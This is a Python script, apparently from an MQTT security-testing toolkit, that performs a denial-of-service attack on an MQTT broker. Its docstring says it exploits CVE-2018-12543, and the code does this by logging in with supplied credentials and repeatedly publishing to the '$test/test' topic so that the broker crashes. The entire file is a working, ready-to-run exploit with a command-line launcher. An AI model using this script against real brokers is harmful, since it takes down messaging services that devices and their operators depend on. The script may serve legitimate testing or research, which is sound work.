import argparse

import mqtt_utilities as util
import paho.mqtt.client as mqtt
import time
import socket
import random


def main(username, password, duration=10):
    """The dollar char dos attack publishes messages to an existing topic with name beginning in $ causing the broker to exit by exploiting CVE-2018-12543"""

    reconnect_delay = 10
    connection = util.Connection_status()
    start_time = time.time()
    while True:
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, userdata={"connection": connection},
                             protocol=mqtt.MQTTv5)
        client.username_pw_set(username, password)
        client.on_connect = util.on_connect
        client.on_disconnect = util.on_disconnect
        client.on_publish = util.on_publish
        if util.connect_client(client, connection, reconnect_delay):
            while connection.connected:
                client.publish("$test/test", "whatever")
                elapsed_time = time.time() - start_time
                print("Execution time: " + str(elapsed_time))
                time.sleep(0.5)
                if elapsed_time >= duration:
                    print("Time elapsed, execution is terminating...", flush=True)
                    return
        else:
            elapsed_time = time.time() - start_time
            print("Execution time: " + str(elapsed_time))
            if elapsed_time >= duration:
                print("Time elapsed, execution is terminating...", flush=True)
                return
            print(f"Resetting client and retrying connection in {reconnect_delay} seconds...", flush=True)
            time.sleep(random.randint(1, 2))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="launch a dollar_char_dos attack from the local machine")
    parser.add_argument("-d", "--duration", type=int, help="duration in seconds")
    parser.add_argument("-u", "--username", type=str, help="username to connect as")
    parser.add_argument("-p", "--password", type=str, help="password to connect with")
    args = parser.parse_args()
    main(args.username, args.password, args.duration)
